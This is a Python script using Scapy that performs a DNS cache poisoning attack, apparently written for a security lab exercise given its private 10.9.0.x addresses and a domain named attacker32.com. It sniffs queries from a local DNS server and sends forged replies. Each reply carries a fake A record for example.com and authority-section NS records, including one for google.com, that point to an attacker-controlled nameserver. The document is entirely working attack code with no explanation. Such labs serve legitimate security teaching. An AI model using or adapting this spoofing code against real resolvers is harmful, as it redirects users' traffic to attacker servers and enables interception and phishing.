#!/usr/bin/env python3
from scapy.all import *
import sys

"""
Flush the DNS cache on local DNS server before with
rndc flush 
"""

# --- CONFIGURATION ---
TARGET_DOMAIN = 'example.com'
OTHER_DOMAIN = 'google.com' # The out-of-bailiwick domain
FAKE_NS = 'ns.attacker32.com.'
ATTACKER_NS_IP = '10.9.0.153'
IFACE = 'br-1d24810f49e2'


def spoof_dns(pkt):
        if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
                qname = pkt[DNS].qd.qname.decode('utf-8')

                if TARGET_DOMAIN in qname:
                        # 1. IP and UDP Headers (Standard swap)
                        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Create an IP object
                        udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UPD object

                        # 2. ANSWER SECTION (The fake IP for the specific query)
                        ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='4.3.3.4',ttl=259200)
                        
                        # 3. AUTHORITY SECTION (The Core of the Attack)
                        ns_sec1 = DNSRR(rrname=TARGET_DOMAIN, type='NS', rdata=FAKE_NS, ttl=259200)
                        ns_sec2 = DNSRR(rrname=OTHER_DOMAIN, type='NS', rdata=FAKE_NS, ttl=259200)

                        # 4. CONSTRUCT DNS PACKET
                        dns = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd, aa=1, qr=1, qdcount=1, ancount=1, an=ans_sec, nscount=2, ns=ns_sec1/ns_sec2)
                        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                        send(spoofpkt) # send(spoofpkt, verbose=0, iface=IFACE)


myFilter = "udp and (src host 10.9.0.53 and dst port 53)" # Set the filter
pkt=sniff(iface='br-1d24810f49e2', filter=myFilter, prn=spoof_dns)